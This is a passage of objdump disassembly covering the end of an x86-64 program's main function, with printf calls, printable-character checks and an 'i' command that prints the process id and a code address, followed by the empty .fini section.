  401724:	44 8b 45 dc          	mov    -0x24(%rbp),%r8d
  401728:	41 d1 e0             	shl    %r8d
  40172b:	44 39 c0             	cmp    %r8d,%eax
  40172e:	48 b9 bb 20 40 00 00 	movabs $0x4020bb,%rcx
  401735:	00 00 00 
  401738:	48 ba c3 20 40 00 00 	movabs $0x4020c3,%rdx
  40173f:	00 00 00 
  401742:	48 0f 4d d1          	cmovge %rcx,%rdx
  401746:	48 bf b6 20 40 00 00 	movabs $0x4020b6,%rdi
  40174d:	00 00 00 
  401750:	48 89 d6             	mov    %rdx,%rsi
  401753:	b0 00                	mov    $0x0,%al
  401755:	e8 f6 f8 ff ff       	call   401050 <printf@plt>
  40175a:	0f b6 75 d2          	movzbl -0x2e(%rbp),%esi
  40175e:	44 0f b6 45 d2       	movzbl -0x2e(%rbp),%r8d
  401763:	41 83 f8 1f          	cmp    $0x1f,%r8d
  401767:	89 75 b0             	mov    %esi,-0x50(%rbp)
  40176a:	7e 12                	jle    40177e <main+0x1fe>
  40176c:	0f b6 45 d2          	movzbl -0x2e(%rbp),%eax
  401770:	83 f8 7f             	cmp    $0x7f,%eax
  401773:	7d 09                	jge    40177e <main+0x1fe>
  401775:	0f b6 45 d2          	movzbl -0x2e(%rbp),%eax
  401779:	89 45 ac             	mov    %eax,-0x54(%rbp)
  40177c:	eb 0a                	jmp    401788 <main+0x208>
  40177e:	b8 3f 00 00 00       	mov    $0x3f,%eax
  401783:	89 45 ac             	mov    %eax,-0x54(%rbp)
  401786:	eb 00                	jmp    401788 <main+0x208>
  401788:	8b 45 ac             	mov    -0x54(%rbp),%eax
  40178b:	8b 4d d8             	mov    -0x28(%rbp),%ecx
  40178e:	48 bf cb 20 40 00 00 	movabs $0x4020cb,%rdi
  401795:	00 00 00 
  401798:	8b 75 b0             	mov    -0x50(%rbp),%esi
  40179b:	89 c2                	mov    %eax,%edx
  40179d:	b0 00                	mov    $0x0,%al
  40179f:	e8 ac f8 ff ff       	call   401050 <printf@plt>
  4017a4:	83 7d dc 00          	cmpl   $0x0,-0x24(%rbp)
  4017a8:	7e 48                	jle    4017f2 <main+0x272>
  4017aa:	0f b6 75 d3          	movzbl -0x2d(%rbp),%esi
  4017ae:	0f b6 45 d3          	movzbl -0x2d(%rbp),%eax
  4017b2:	83 f8 1f             	cmp    $0x1f,%eax
  4017b5:	89 75 a8             	mov    %esi,-0x58(%rbp)
  4017b8:	7e 12                	jle    4017cc <main+0x24c>
  4017ba:	0f b6 45 d3          	movzbl -0x2d(%rbp),%eax
  4017be:	83 f8 7f             	cmp    $0x7f,%eax
  4017c1:	7d 09                	jge    4017cc <main+0x24c>
  4017c3:	0f b6 45 d3          	movzbl -0x2d(%rbp),%eax
  4017c7:	89 45 a4             	mov    %eax,-0x5c(%rbp)
  4017ca:	eb 0a                	jmp    4017d6 <main+0x256>
  4017cc:	b8 3f 00 00 00       	mov    $0x3f,%eax
  4017d1:	89 45 a4             	mov    %eax,-0x5c(%rbp)
  4017d4:	eb 00                	jmp    4017d6 <main+0x256>
  4017d6:	8b 45 a4             	mov    -0x5c(%rbp),%eax
  4017d9:	8b 4d dc             	mov    -0x24(%rbp),%ecx
  4017dc:	48 bf e1 20 40 00 00 	movabs $0x4020e1,%rdi
  4017e3:	00 00 00 
  4017e6:	8b 75 a8             	mov    -0x58(%rbp),%esi
  4017e9:	89 c2                	mov    %eax,%edx
  4017eb:	b0 00                	mov    $0x0,%al
  4017ed:	e8 5e f8 ff ff       	call   401050 <printf@plt>
  4017f2:	48 bf 8b 20 40 00 00 	movabs $0x40208b,%rdi
  4017f9:	00 00 00 
  4017fc:	b0 00                	mov    $0x0,%al
  4017fe:	e8 4d f8 ff ff       	call   401050 <printf@plt>
  401803:	e9 b4 fe ff ff       	jmp    4016bc <main+0x13c>
  401808:	eb 4a                	jmp    401854 <main+0x2d4>
  40180a:	0f be 45 ef          	movsbl -0x11(%rbp),%eax
  40180e:	83 f8 0a             	cmp    $0xa,%eax
  401811:	75 05                	jne    401818 <main+0x298>
  401813:	e9 86 fd ff ff       	jmp    40159e <main+0x1e>
  401818:	0f be 45 ef          	movsbl -0x11(%rbp),%eax
  40181c:	83 f8 69             	cmp    $0x69,%eax
  40181f:	75 2d                	jne    40184e <main+0x2ce>
  401821:	b0 00                	mov    $0x0,%al
  401823:	e8 08 f8 ff ff       	call   401030 <getpid@plt>
  401828:	48 b9 70 11 40 00 00 	movabs $0x401170,%rcx
  40182f:	00 00 00 
  401832:	48 83 c1 21          	add    $0x21,%rcx
  401836:	48 bf 05 21 40 00 00 	movabs $0x402105,%rdi
  40183d:	00 00 00 
  401840:	48 89 ce             	mov    %rcx,%rsi
  401843:	89 c2                	mov    %eax,%edx
  401845:	b0 00                	mov    $0x0,%al
  401847:	e8 04 f8 ff ff       	call   401050 <printf@plt>
  40184c:	eb 02                	jmp    401850 <main+0x2d0>
  40184e:	eb 09                	jmp    401859 <main+0x2d9>
  401850:	eb 00                	jmp    401852 <main+0x2d2>
  401852:	eb 00                	jmp    401854 <main+0x2d4>
  401854:	e9 45 fd ff ff       	jmp    40159e <main+0x1e>
  401859:	31 c0                	xor    %eax,%eax
  40185b:	48 83 c4 60          	add    $0x60,%rsp
  40185f:	5d                   	pop    %rbp
  401860:	c3                   	ret    

Disassembly of section .fini:

0000000000401864 <_fini>:
  401864:	f3 0f 1e fa          	endbr64 
  401868:	48 83 ec 08          	sub    $0x8,%rsp
  40186c:	48 83 c4 08          	add    $0x8,%rsp
  401870:	c3                   	ret    
